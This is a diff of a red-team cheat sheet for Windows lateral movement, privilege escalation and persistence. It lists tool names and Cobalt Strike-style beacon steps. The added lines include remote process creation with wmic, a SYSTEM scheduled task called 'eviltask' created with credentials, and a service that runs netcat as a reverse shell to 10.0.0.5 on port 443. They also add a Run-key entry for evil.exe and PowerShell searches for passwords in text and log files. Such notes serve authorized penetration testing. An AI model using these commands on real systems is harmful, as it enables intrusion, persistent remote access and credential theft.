@@ -1,3 +1,7 @@
+RT Tips: https://github.com/vysecurity/RedTips
+RT Experiments: https://ired.team/
+RT Tyranidslair: https://tyranidslair.blogspot.com/2019/
+
 GhostPack Tools
   Seatbelt.exe system|user (Opsec Tool)
   SharpUp.exe (Privesc Tool)
@@ -64,12 +68,16 @@ Lateral Movement
   make_token username password
   shell dir \\system\c$ (Check if admin)
   shell net use \\system\c$
-  wmi system listener (tab complete listener)
+  wmi system listener (tab complete listener) 
+    OR powershell_psh
   spawn x64 listener (New listerner that is not Powershell)
   unlink ip addr of attack system (from target; can tab complete)
   link ip addr of target system (from attack box; verify dual home IP addresses)
   exit original beacon
   verify no powershell is running
+  
+  wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"
+  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
   
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
@@ -132,6 +140,15 @@ PrivEsc
     
   Persistance
     schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
-    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s comp_name /u user /p password
+    sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
+      sc start evilsvc
+    reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
+    
+  Powershell Search
+    Find files with passwords in contencts of TXT and LOG Files
+      ls -r -d 2 -i *.txt,*.log c:\path | sls -patt 'pass' | select Line, Path (or Out-File ./file.txt)
+    Files last write time in the last 30 days.
+      ls -r -d 2 -i *pass* c:\path | ? {$_.LastWriteTime -lt (Get-Date).AddDays(-30)} | select LastWriteTime, FullName | epcsv -NotypeInformation ./test.csv
+
     
  Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
